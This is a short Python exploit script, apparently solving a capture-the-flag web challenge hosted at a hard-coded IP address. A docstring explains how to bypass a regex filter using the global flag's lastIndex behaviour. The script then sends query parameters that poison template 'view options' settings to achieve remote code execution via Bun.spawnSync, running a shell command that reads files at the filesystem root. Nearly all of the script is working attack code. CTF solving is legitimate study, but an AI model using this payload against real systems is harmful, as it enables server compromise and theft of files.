import httpx

URL = "http://54.251.191.248:45194/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def get(s, params):
        return s.c.get("/", params=params)


class API(BaseAPI):
    ...


if __name__ == "__main__":
    api = API()
    """
    When a regex has the global flag set, `test()` will increment the `lastIndex` of the regex. Subsequent calls to `test(str)` will continue searching `str` from the updated `lastIndex`. The `lastIndex` property will keep increasing each time `test()` returns true.

    We can leverage this behavior to bypass regex searches by appending additional characters before the string that is regex-matched. This way, the `lastIndex` will not start from the beginning, allowing us to bypass the regex match.


    # Reference
    https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test
    https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/ezxxe
    """
    res = api.get({
        "message": "x",
        " settings": "x",
        "settings[ view options]": "x",
        "settings[view options][ escape]": "x",
        "settings[view options][escape]": "Object;return Bun.spawnSync(['sh','-c','cat /*']).stdout",
        "settings[view options][ client]": "x",
        "settings[view options][client]": 1,
    })
    print(res.text)
